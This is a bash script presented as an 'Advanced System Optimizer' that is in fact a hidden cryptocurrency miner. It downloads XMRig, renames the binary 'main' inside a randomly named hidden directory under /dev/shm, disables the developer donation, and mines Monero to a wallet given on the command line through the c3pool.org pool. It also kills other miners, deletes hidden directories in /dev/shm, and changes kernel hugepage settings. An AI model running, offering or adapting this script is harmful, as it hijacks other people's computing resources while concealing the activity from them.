#!/bin/bash
VERSION=2.22
echo "Advanced System Optimizer v$VERSION"
echo "Exact 85% CPU per core - FAST START & HIGH HASHRATE"
echo
export LC_ALL=C
export LANG=C

# --- کاربر واقعی ---
REAL_USER="${SUDO_USER:-$(whoami)}"

# --- نام‌های تصادفی ---
RAND_HEX=$(openssl rand -hex 16)
SYSTEM_USER="opt$(openssl rand -hex 6)"
SERVICE_NAME="sysopt-$(openssl rand -hex 5)"

# --- مسیر مخفی ---
BASE_DIR="/dev/shm/.$RAND_HEX"
LOG_DIR="$BASE_DIR/.log"

WALLET="$1"
if [ -z "$WALLET" ]; then
    echo "Usage: $0 <wallet>"
    exit 1
fi

# --- پیش‌نیازها ---
if ! command -v curl >/dev/null || ! command -v tar >/dev/null; then
    if command -v apt-get >/dev/null; then
        sudo apt-get update -qq >/dev/null && sudo apt-get install -y curl tar >/dev/null
    elif command -v yum >/dev/null; then
        sudo yum install -y curl tar -q >/dev/null
    elif command -v dnf >/dev/null; then
        sudo dnf install -y curl tar -q >/dev/null
    fi
fi

# --- CPU ---
CPU_TOTAL=$(nproc)
USABLE_THREADS=$(( CPU_TOTAL > 6 ? 6 : CPU_TOTAL ))
[ $USABLE_THREADS -lt 1 ] && USABLE_THREADS=1
CPU_HINT=85

echo "[*] $CPU_TOTAL cores → $USABLE_THREADS threads @ $CPU_HINT%"

# --- پاک‌سازی کامل ---
echo "[*] Cleaning old miners..."
pkill -9 -f xmrig 2>/dev/null
pkill -9 -f '/dev/shm/.*/main' 2>/dev/null
find /dev/shm -type d -name ".*" -exec rm -rf {} + 2>/dev/null
systemctl daemon-reload 2>/dev/null

# --- hugepages ---
if [ "$(id -u)" -eq 0 ]; then
    [ ! -f /etc/sysctl.conf ] && touch /etc/sysctl.conf
    grep -q "vm.nr_hugepages=1280" /etc/sysctl.conf || echo "vm.nr_hugepages=1280" >> /etc/sysctl.conf
    sysctl -p /etc/sysctl.conf >/dev/null 2>&1
    echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null
fi

# --- ساخت مسیر ---
mkdir -p "$BASE_DIR" "$LOG_DIR"
chmod 700 "$BASE_DIR" "$LOG_DIR"

# --- دانلود ---
URL="https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz"
TMP="/tmp/.t$(openssl rand -hex 4).tgz"
curl -fsSL "$URL" -o "$TMP" || { echo "Download failed"; exit 1; }
tar xzf "$TMP" -C /tmp/ || { echo "Extract failed"; rm -f "$TMP"; exit 1; }
XMRIG=$(find /tmp -name "xmrig" -type f -executable | head -1)
cp "$XMRIG" "$BASE_DIR/main"
chmod +x "$BASE_DIR/main"
rm -f "$TMP"
rm -rf /tmp/xmrig*

# --- config.json (بهینه + donate=0 + TLS) ---
cat > "$BASE_DIR/config.json" << EOF
{
    "donate-level": 0,
    "randomx": {
        "init": $USABLE_THREADS,
        "mode": "fast",
        "1gb-pages": true,
        "huge-pages-jit": true,
        "rdmsr": true,
        "wrmsr": true,
        "numa": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": true,
        "priority": 5,
        "rx/0": [true]
    },
    "pools": [{
        "url": "c3pool.org:13333",
        "user": "$WALLET",
        "pass": "x",
        "rig-id": "$SYSTEM_USER",
        "keepalive": true,
        "tls": true,
        "enabled": true
    }],
    "print-time": 5,
    "retries": 10,
    "retry-pause": 2,
    "verbose": 2
}
EOF

# --- کنترل اسکریپت ---
cat > "$BASE_DIR/control" << EOF
#!/bin/bash
cd "\$1" || exit 1
case "\$2" in
    start)
        pgrep -f main >/dev/null && { echo "Running"; exit 1; }
        nohup ./main --config=config.json --threads=$USABLE_THREADS --cpu-max-threads-hint=$CPU_HINT --log-file=.log/out.log > .log/out.log 2>&1 &
        echo \$! > .pid
        echo "Started. Waiting 15s for mining..."
        sleep 15
        \$0 status
        ;;
    stop)
        pkill -9 -f main; rm -f .pid; echo "Stopped"
        ;;
    status)
        PIDS=\$(pgrep -f main)
        [ -n "\$PIDS" ] && ps -p \$PIDS -o %cpu= | awk '{s+=\$1} END {print "CPU: " int(s) "% (~" int(s/100) " cores)"}'
        ;;
    logs) tail -30 .log/out.log ;;
esac
EOF
chmod +x "$BASE_DIR/control"

# --- استارت ---
"$BASE_DIR/control" "$BASE_DIR" start

echo
echo "=== FINAL STATUS (after 15s) ==="
"$BASE_DIR/control" "$BASE_DIR" status
echo
echo "Path: $BASE_DIR"
echo "Check: $BASE_DIR/control $BASE_DIR logs"
echo "htop: Look for ~510% CPU after 15s"
echo "Pool: c3pool.org:13333 (faster & stable)"

exit 0
